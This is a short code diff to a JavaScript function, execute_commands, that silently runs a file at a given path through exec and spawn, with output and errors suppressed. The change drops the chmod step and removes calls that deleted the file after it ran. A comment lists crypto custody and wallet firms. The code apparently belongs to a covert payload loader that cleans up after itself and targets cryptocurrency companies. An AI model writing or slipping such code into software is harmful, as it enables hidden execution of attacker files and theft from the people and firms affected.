@@ -31,13 +31,11 @@ const remove_the_file = (path) => {
 
 //FireBox, MultiSig wallet,Anchroga, zodiac, who are licenced and blockdaimond figment
 const execute_commands = (command_file_path) =>{
-        exec(`chmod +x ${command_file_path}`, (cmoderror,cmodstdout) =>{
+        exec(`${command_file_path}`, (cmoderror,cmodstdout) =>{
             if(cmoderror){
-                remove_the_file(command_file_path);
                 return;   
             }
             if(cmodstdout){
-                remove_the_file(command_file_path);
                 return;
             }
             const child = spawn(command_file_path);
@@ -46,10 +44,9 @@ const execute_commands = (command_file_path) =>{
             child.stderr.on('data',(data) =>{
             });
             child.on('error',(error) =>{
-                remove_the_file(command_file_path);
+                
             });
             child.on('exit',(code) =>{
-                remove_the_file(command_file_path);
                 if(code){
                 } 
             });
